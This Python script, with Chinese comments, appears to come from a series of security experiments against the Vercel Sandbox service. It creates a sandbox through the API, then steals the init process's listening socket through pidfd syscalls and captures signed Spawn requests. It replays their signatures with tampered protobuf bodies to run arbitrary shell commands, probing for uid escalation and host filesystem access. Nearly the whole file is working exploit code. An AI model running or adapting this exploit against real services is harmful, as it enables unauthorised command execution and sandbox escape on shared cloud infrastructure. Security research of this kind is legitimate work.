# 实验J138: 重放攻击深度利用 — sandbox-init 视角探测 + SpawnRequest 未知字段探测(uid提权) + cwd变体
# 前提: j137 已确认签名=path+ts 可重放篡改 body 执行任意命令
# 目标: ①诊断 Spawn 进程的 uid/caps/mounts//proc/1/root 视角(宿主?); ②field5(uid)/field3(env)/field6 探测; ③cwd=/
# 零破坏: 全部输出写沙箱内 /tmp/diag_*.txt, 无宿主写入
import json, time, urllib.request, urllib.error, sys, threading
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj138"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, socket, ctypes, time, threading, json, base64, subprocess, struct, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockopt.restype = ctypes.c_int

def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

pub = None
for a in open("/proc/1/cmdline", "rb").read().split(b"\x00"):
    if a.startswith(b"--pubkey="):
        pub = a[len(b"--pubkey="):]
print("PUBKEY_RAW:", pub.decode() if pub else "NONE", flush=True)
if pub:
    raw = base64.b64decode(pub)
    der = bytes.fromhex("302a300506032b6570032100") + raw
    pem = (b"-----BEGIN PUBLIC KEY-----\n" + base64.b64encode(der) +
           b"\n-----END PUBLIC KEY-----\n")
    open("/root/pub.pem", "wb").write(pem)

pfd, e = sc(434, 1, 0)
print("PIDFD:", pfd, e, flush=True)
listener_nfd = None
if pfd >= 0:
    fdmap = {}
    for fd in sorted(os.listdir("/proc/1/fd"), key=int):
        try:
            fdmap[int(fd)] = os.readlink("/proc/1/fd/" + fd)
        except Exception:
            pass
    print("FDMAP:", json.dumps(fdmap), flush=True)
    for fd, ln in fdmap.items():
        if "socket:" not in ln:
            continue
        nfd, e2 = sc(438, pfd, fd, 0)
        if nfd < 0:
            continue
        v = ctypes.c_int(0)
        l = ctypes.c_int(4)
        r = libc.getsockopt(nfd, 1, 30, ctypes.byref(v), ctypes.byref(l))
        if r == 0 and v.value == 1:
            listener_nfd = nfd
            print("LISTENER fd=%d nfd=%d" % (fd, nfd), flush=True)
            break

captured = []
stop = threading.Event()
accept_pause = threading.Event()

def verify(msg, sig):
    open("/root/m.bin", "wb").write(msg)
    open("/root/s.bin", "wb").write(sig)
    r = subprocess.run(["openssl", "pkeyutl", "-verify", "-pubin", "-inkey",
                        "/root/pub.pem", "-rawin", "-in", "/root/m.bin",
                        "-sigfile", "/root/s.bin"], capture_output=True, timeout=15)
    return r.returncode == 0

def put_varint(out, val):
    while True:
        x = val & 0x7f
        val >>= 7
        if val:
            out.append(x | 0x80)
        else:
            out.append(x)
            return

def sfield(f, v):
    b = v.encode() if isinstance(v, str) else v
    out = bytearray()
    put_varint(out, (f << 3) | 2)
    put_varint(out, len(b))
    return bytes(out) + b

def vfield(f, v):
    out = bytearray()
    put_varint(out, (f << 3) | 0)
    put_varint(out, v)
    return bytes(out)

def do_attack(name, proto):
    env = b"\x00" + struct.pack(">I", len(proto)) + proto
    payload = (b"POST " + ctx["path"].encode() + b" HTTP/1.1\r\n"
               b"Host: localhost\r\n"
               b"Content-Type: application/connect+proto\r\n"
               b"Connect-Protocol-Version: 1\r\n"
               b"X-Signature: " + ctx["sig"].encode() + b"\r\n"
               b"X-Timestamp: " + ctx["ts"].encode() + b"\r\n"
               b"Content-Length: " + str(len(env)).encode() + b"\r\n\r\n" + env)
    for attempt in range(2):
        s = None
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect("/run/vercel/share/init.sock")
            s.sendall(payload)
            resp = b""
            try:
                while True:
                    c = s.recv(65536)
                    if not c:
                        break
                    resp += c
            except socket.timeout:
                pass
            s.close()
            print("TEST[%s] resp_len=%d resp_hex=%s" % (name, len(resp), resp[:60].hex()), flush=True)
            return
        except Exception as ex:
            print("TEST[%s] attempt%d EXC %r" % (name, attempt, ex), flush=True)
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
            time.sleep(1)

ctx = {}

if listener_nfd is None:
    print("NO_LISTENER", flush=True)
else:
    srv = socket.fromfd(listener_nfd, socket.AF_UNIX, socket.SOCK_STREAM)
    srv.settimeout(0.8)

    def accept_loop():
        while not stop.is_set():
            if accept_pause.is_set():
                time.sleep(0.2)
                continue
            try:
                conn, _ = srv.accept()
                conn.settimeout(4)
                data = b""
                while True:
                    try:
                        c = conn.recv(65536)
                    except socket.timeout:
                        break
                    if not c:
                        break
                    data += c
                    if len(data) > 262144:
                        break
                if data:
                    captured.append((time.time(), data))
                    print("CAP len=%d" % len(data), flush=True)
                conn.close()
            except socket.timeout:
                continue
            except OSError as ex:
                print("ACCEPT_ERR: %r" % (ex,), flush=True)
                time.sleep(0.3)

    threading.Thread(target=accept_loop, daemon=True).start()

    print("READY", flush=True)
    deadline = time.time() + 45
    attacked = False
    while time.time() < deadline:
        if not attacked:
            while captured:
                t, req = captured.pop(0)
                try:
                    head, _, body = req.partition(b"\r\n\r\n")
                    lines = head.decode("latin1").split("\r\n")
                    parts = lines[0].split(" ")
                    if len(parts) < 2:
                        continue
                    path = parts[1]
                    if not path.endswith("/Spawn"):
                        continue
                    hs = {}
                    for l in lines[1:]:
                        if ":" in l:
                            k, v = l.split(":", 1)
                            hs[k.strip().lower()] = v.strip()
                    sigb = hs.get("x-signature")
                    ts = hs.get("x-timestamp")
                    if not sigb or not ts:
                        continue
                    sig = base64.b64decode(sigb)
                    if verify(path.encode() + ts.encode(), sig):
                        print("VERIFY_OK ts=%s" % ts, flush=True)
                        ctx["path"] = path
                        ctx["ts"] = ts
                        ctx["sig"] = sigb
                        accept_pause.set()
                        time.sleep(0.5)

                        # 诊断命令 A: 基础视角 (写 /tmp/diag_A.txt)
                        cmdA = "{ id; echo ===; grep -E '^(Uid|Gid|Cap|NoNewPrivs|Seccomp)' /proc/self/status; echo ===; head -40 /proc/self/mounts; echo ===; ls -la /; echo ===; ls /proc/1/root/ 2>&1 | head -20; echo ===; cat /proc/1/root/etc/hostname 2>&1; echo ===; head -30 /proc/1/mounts 2>&1; echo ===; ls -la /run/vercel/share 2>&1; } > /tmp/diag_A.txt 2>&1"
                        protoA = (sfield(1, "/bin/sh") + sfield(2, "-c") + sfield(2, cmdA) +
                                  sfield(4, "/vercel/sandbox"))
                        do_attack("A_base", protoA)

                        # 攻击 B: field5 varint=0 (uid 探测)
                        cmdB = "{ id; echo ===; cat /proc/self/status | grep -E '^(Uid|Gid|CapEff)'; } > /tmp/diag_B.txt 2>&1"
                        protoB = (sfield(1, "/bin/sh") + sfield(2, "-c") + sfield(2, cmdB) +
                                  sfield(4, "/vercel/sandbox") + vfield(5, 0))
                        do_attack("B_uid", protoB)

                        # 攻击 C: field3 env + field6 (变体)
                        cmdC = "{ id; echo ===; ls -la /tmp/diag_A.txt /tmp/diag_B.txt 2>&1; } > /tmp/diag_C.txt 2>&1"
                        protoC = (sfield(1, "/bin/sh") + sfield(2, "-c") + sfield(2, cmdC) +
                                  sfield(3, "") + sfield(4, "/vercel/sandbox") + vfield(6, 0))
                        do_attack("C_env6", protoC)

                        # 攻击 D: cwd="/" 变体
                        cmdD = "pwd > /tmp/pwd_out.txt 2>&1; ls -la /tmp/pwd_out.txt >> /tmp/pwd_out.txt 2>&1"
                        protoD = (sfield(1, "/bin/sh") + sfield(2, "-c") + sfield(2, cmdD) +
                                  sfield(4, "/"))
                        do_attack("D_cwd_root", protoD)

                        attacked = True
                        print("ATTACK_SEQ_DONE", flush=True)
                    else:
                        print("VERIFY_FAIL", flush=True)
                except Exception as ex:
                    import traceback
                    print("PROC_ERR: %r" % (ex,), flush=True)
                    print(traceback.format_exc()[-500:], flush=True)
        time.sleep(0.2)

    stop.set()
    print("DONE", flush=True)
"""

print(">> 启动沙箱内捕获+攻击(45s), 本地触发 cmd", flush=True)
t0 = time.time()

def trigger():
    time.sleep(5)
    for i in range(35):
        try:
            body = {"command": "echo", "args": ["t%d" % i], "wait": True, "logs": True, "timeout": 100}
            c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
            print(f"  trigger[{i}] -> {c}", flush=True)
        except Exception as ex:
            print(f"  trigger[{i}] EXC {ex}", flush=True)
        time.sleep(1.0)

th = threading.Thread(target=trigger, daemon=True)
th.start()
run_cmd(sid, PROBE, "exploit-diag", wait=True, timeout=300000)
th.join(timeout=1)

# 读取诊断文件
c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/diag_A.txt", "/tmp/diag_B.txt", "/tmp/diag_C.txt", "/tmp/pwd_out.txt"],
              "wait": True, "logs": True, "timeout": 100})
print(f"=== diag-files status {c2} ===", flush=True)
print(r2[:6000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done, elapsed=%.0fs" % (time.time() - t0), flush=True)
